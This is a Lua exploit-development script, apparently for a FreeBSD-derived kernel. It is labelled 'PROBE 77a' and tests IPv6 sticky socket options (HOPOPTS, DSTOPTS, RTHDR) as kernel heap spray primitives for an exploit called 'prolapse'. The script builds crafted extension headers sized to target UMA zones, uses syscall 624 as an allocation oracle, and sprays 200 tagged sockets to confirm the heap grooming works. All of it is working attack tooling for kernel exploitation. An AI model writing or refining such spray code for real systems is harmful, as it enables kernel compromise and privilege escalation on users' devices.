-- CRASH_CLASS: LOW
-- PROBE 77a: test IPv6 sticky option spray primitives for prolapse
--
-- Tests IPV6_DSTOPTS(50), IPV6_HOPOPTS(49), IPV6_RTHDR(51) with
-- properly formatted ext-headers (PadN TLV for DSTOPTS/HOPOPTS,
-- type-0 routing header for RTHDR). For each working option:
--   A) setsockopt with tag at +8, getsockopt readback, verify tag
--   B) Multiple sizes to find which UMA zones we can target
--   C) 624 oracle measurement to count kernel allocs per setsockopt
--   D) Volume spray: 200 sockets, each tagged, readback all

print("=== PROBE 77a: PROLAPSE SPRAY PRIMITIVE TEST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function rb(a)
    local ok, v = pcall(function() return N(memory.read_byte(a)) end)
    if ok then return v end return 0
end

local sc_socket = mk(97)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_close = mk(6)
local sc_624 = mk(624)

local function call(sc, ...)
    local ok, v = pcall(sc, ...)
    if not ok then return -999 end
    return N(v)
end

local function read_624()
    return call(sc_624, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
end

-- Build a valid DSTOPTS/HOPOPTS ext-header with PadN TLV
-- Format: [nxt=0][len=(size/8)-1][PadN type=1][PadN len=size-4][padding...]
local function build_dstopts(buf, size, tag)
    for i = 0, size - 1 do wb(N(buf) + i, 0) end
    wb(N(buf), 0)                    -- nxt
    wb(N(buf) + 1, (size / 8) - 1)  -- ext len in 8-octet units
    wb(N(buf) + 2, 1)               -- PadN option type
    wb(N(buf) + 3, size - 4)        -- PadN data length
    -- tag at offset +8
    wd(N(buf) + 8, tag)
end

-- Build a valid RTHDR type-0 header
local function build_rthdr(buf, size, tag)
    for i = 0, size - 1 do wb(N(buf) + i, 0) end
    wb(N(buf), 0)                        -- nxt
    wb(N(buf) + 1, (size / 8) - 1)      -- ext len
    wb(N(buf) + 2, 0)                   -- type 0
    wb(N(buf) + 3, (size - 8) / 16)     -- segments left
    -- tag at offset +8
    wd(N(buf) + 8, tag)
end

local buf = memory.alloc(1024)
local outbuf = memory.alloc(1024)
local outlen = memory.alloc(8)

-- ============================================================
-- SECTION A: Test each option with a 56-byte (64B zone) header
-- ============================================================
print("[A] OPTION AVAILABILITY (56 bytes = 64B UMA zone)")
print("")

local opts = {
    {name = "IPV6_HOPOPTS", num = 49, builder = build_dstopts},
    {name = "IPV6_DSTOPTS", num = 50, builder = build_dstopts},
    {name = "IPV6_RTHDR",   num = 51, builder = build_rthdr},
}

local working = {}

for _, o in ipairs(opts) do
    local fd = call(sc_socket, uint64(28), uint64(2), uint64(0))
    if fd < 0 then
        print(string.format("  %s: socket failed fd=%d", o.name, fd))
    else
        o.builder(buf, 56, 0xDEAD0077)

        local set_rv = call(sc_setsockopt, uint64(fd), uint64(41), uint64(o.num),
            buf, uint64(56))

        -- readback
        for i = 0, 63 do wb(N(outbuf) + i, 0xCC) end
        wd(N(outlen), 128)
        local get_rv = call(sc_getsockopt, uint64(fd), uint64(41), uint64(o.num),
            outbuf, outlen)
        local got_len = rd(N(outlen)) or 0
        local got_tag = rd(N(outbuf) + 8) or 0

        local hex = {}
        for i = 0, math.min(got_len, 16) - 1 do
            hex[#hex + 1] = string.format("%02X", rb(N(outbuf) + i))
        end

        print(string.format("  %s: set=%d get=%d len=%d tag=0x%08X first16=[%s]",
            o.name, set_rv, get_rv, got_len, got_tag, table.concat(hex, " ")))

        if set_rv == 0 and get_rv == 0 and got_tag == 0xDEAD0077 then
            print(string.format("    >>> TAG ROUND-TRIP OK <<<"))
            working[#working + 1] = o
        end

        call(sc_close, uint64(fd))
    end
end

print("")
print(string.format("Working options: %d", #working))
if #working == 0 then
    print("NO SPRAY PRIMITIVE AVAILABLE - prolapse path blocked")
    print("=== 77a COMPLETE ===")
    return
end

-- ============================================================
-- SECTION B: Test multiple sizes for each working option
-- Sizes map to UMA zones: 56->64B, 120->128B, 248->256B
-- m_aio_reqs2 = 0x58 (88 bytes) -> 128B zone per prolapse code
-- (the gist says 0x80 zone; need to measure which)
-- ============================================================
print("")
print("[B] SIZE SWEEP")
print("")

local best_opt = working[1]
local sizes = {24, 40, 56, 72, 88, 104, 120, 184, 248}

for _, sz in ipairs(sizes) do
    local fd = call(sc_socket, uint64(28), uint64(2), uint64(0))
    if fd < 0 then break end

    best_opt.builder(buf, sz, 0xBBCC0000 + sz)
    local set_rv = call(sc_setsockopt, uint64(fd), uint64(41), uint64(best_opt.num),
        buf, uint64(sz))

    for i = 0, 7 do wb(N(outbuf) + i, 0xCC) end
    wd(N(outlen), 1024)
    local get_rv = call(sc_getsockopt, uint64(fd), uint64(41), uint64(best_opt.num),
        outbuf, outlen)
    local got_len = rd(N(outlen)) or 0
    local got_tag = rd(N(outbuf) + 8) or 0

    local zone = sz <= 64 and 64 or sz <= 128 and 128 or sz <= 256 and 256 or 512
    print(string.format("  sz=%3d zone=%3d: set=%d get=%d rlen=%d tag=0x%08X %s",
        sz, zone, set_rv, get_rv, got_len, got_tag,
        (got_tag == 0xBBCC0000 + sz) and "OK" or "MISMATCH"))

    call(sc_close, uint64(fd))
end

-- ============================================================
-- SECTION C: 624 oracle — count kernel VM ops per setsockopt
-- ============================================================
print("")
print("[C] 624 ORACLE: kernel allocs per setsockopt")
print("")

local before = read_624()
local N_ALLOCS = 20

for i = 1, N_ALLOCS do
    local fd = call(sc_socket, uint64(28), uint64(2), uint64(0))
    if fd >= 0 then
        best_opt.builder(buf, 120, 0xAAAA0000 + i)
        call(sc_setsockopt, uint64(fd), uint64(41), uint64(best_opt.num),
            buf, uint64(120))
        call(sc_close, uint64(fd))
    end
end

local after = read_624()
print(string.format("  624 before=%d after=%d delta=%d for %d socket+set+close cycles",
    before, after, after - before, N_ALLOCS))
print(string.format("  delta per cycle = %.1f", (after - before) / N_ALLOCS))

-- Now measure set only (reuse socket)
local fd_measure = call(sc_socket, uint64(28), uint64(2), uint64(0))
if fd_measure >= 0 then
    before = read_624()
    for i = 1, N_ALLOCS do
        best_opt.builder(buf, 120, 0xBBBB0000 + i)
        call(sc_setsockopt, uint64(fd_measure), uint64(41), uint64(best_opt.num),
            buf, uint64(120))
    end
    after = read_624()
    print(string.format("  624 re-set same fd: before=%d after=%d delta=%d for %d sets",
        before, after, after - before, N_ALLOCS))
    print(string.format("  delta per re-set = %.1f (should be ~0 if reuses buffer)",
        (after - before) / N_ALLOCS))
    call(sc_close, uint64(fd_measure))
end

-- ============================================================
-- SECTION D: Volume spray with tag readback (200 sockets)
-- Verify every tag survives and no overlap in clean state
-- ============================================================
print("")
print("[D] VOLUME SPRAY: 200 sockets, tag readback")
print("")

local SPRAY_N = 200
local fds = {}
local set_ok = 0
local get_ok = 0
local tag_ok = 0
local tag_fail = 0

for i = 1, SPRAY_N do
    local fd = call(sc_socket, uint64(28), uint64(2), uint64(0))
    fds[i] = fd
    if fd >= 0 then
        best_opt.builder(buf, 120, 0x77AA0000 + i)
        local rv = call(sc_setsockopt, uint64(fd), uint64(41), uint64(best_opt.num),
            buf, uint64(120))
        if rv == 0 then set_ok = set_ok + 1 end
    end
end

print(string.format("  sprayed %d sockets, set_ok=%d", SPRAY_N, set_ok))

-- readback
for i = 1, SPRAY_N do
    if fds[i] and fds[i] >= 0 then
        for j = 0, 15 do wb(N(outbuf) + j, 0xCC) end
        wd(N(outlen), 1024)
        local rv = call(sc_getsockopt, uint64(fds[i]), uint64(41), uint64(best_opt.num),
            outbuf, outlen)
        if rv == 0 then
            get_ok = get_ok + 1
            local tag = rd(N(outbuf) + 8) or 0
            if tag == 0x77AA0000 + i then
                tag_ok = tag_ok + 1
            else
                tag_fail = tag_fail + 1
                if tag_fail <= 10 then
                    print(string.format("    TAG MISMATCH fd[%d]=%d: expected 0x%08X got 0x%08X",
                        i, fds[i], 0x77AA0000 + i, tag))
                end
            end
        end
    end
end

print(string.format("  get_ok=%d tag_ok=%d tag_fail=%d", get_ok, tag_ok, tag_fail))

-- cleanup
for i = 1, SPRAY_N do
    if fds[i] and fds[i] >= 0 then call(sc_close, uint64(fds[i])) end
end

print("")
if tag_ok == set_ok and set_ok > 0 then
    print("SPRAY PRIMITIVE CONFIRMED: tag round-trip works at volume")
    print(string.format("Best option: %s (%d)", best_opt.name, best_opt.num))
else
    print(string.format("SPRAY ISSUE: %d/%d tags verified", tag_ok, set_ok))
end

print("")
print("=== PROBE 77a COMPLETE ===")
